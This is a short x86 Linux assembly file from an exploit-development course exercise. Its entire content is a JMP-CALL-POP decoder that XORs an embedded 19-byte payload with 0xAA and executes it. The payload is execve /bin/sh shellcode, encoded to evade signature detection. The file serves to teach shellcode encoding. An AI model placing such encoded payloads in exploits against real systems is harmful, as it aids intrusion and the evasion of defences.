; Executable name       : xor-decoder
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of xor encoded shellcode
;
;

SECTION .text

global _start

_start:

	jmp short call_decoder				; JMP to call_decoder

decoder:
	pop ebx						; POP our shellcode address
							; into EBX

	xor ecx,ecx					; zero out
	mov cl,19					; MOV the length of shellcode
							; into CL.
decode:
	xor byte [ebx],0xAA				; XOR every byte in EBX with
							; 0xAA

	inc ebx						; itterate for every byte

	loop decode					; loop for every byte 19 times

	jmp short shellcode				; shellcode has been decoded
							; JMP to it and execute


call_decoder:
	call decoder					; CALL the decoder

shellcode:
	db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2	; prevously encoded
	db 0xc2,0x85,0xc8,0xc3,0xc4,0x1a,0xa1,0x23	; shellcode.
	db 0x49,0x67,0x2a				; ^

